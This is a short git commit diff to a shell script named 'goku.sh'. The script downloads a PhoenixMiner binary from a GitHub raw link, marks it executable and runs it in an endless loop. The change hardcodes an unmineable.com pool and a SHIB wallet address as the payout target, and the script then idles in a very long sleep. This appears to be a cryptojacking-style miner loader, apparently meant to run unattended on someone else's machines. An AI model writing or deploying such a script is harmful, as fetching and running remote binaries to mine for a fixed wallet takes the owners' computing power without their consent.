ac8a9d17b1f0bafd64dc64888c2d6ca2ebf08a50
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-09 22:39:01 +0530

    Update goku.sh

--- goku.sh
+++ goku.sh
@@ -5,7 +5,8 @@ WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGE)
 wget https://github.com/skullCANDe/skyz/raw/main/PhoenixMiner
 chmod +x PhoenixMiner
 while [ 1 ]; do
-./PhoenixMiner -pool $POOL -wal $WALLET.$WORKER -pass x
+./PhoenixMiner -epool ethash.unmineable.com:3333 -worker SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383.Miner01 -pass x
+pause 
 sleep 5
 done
 sleep 999999999
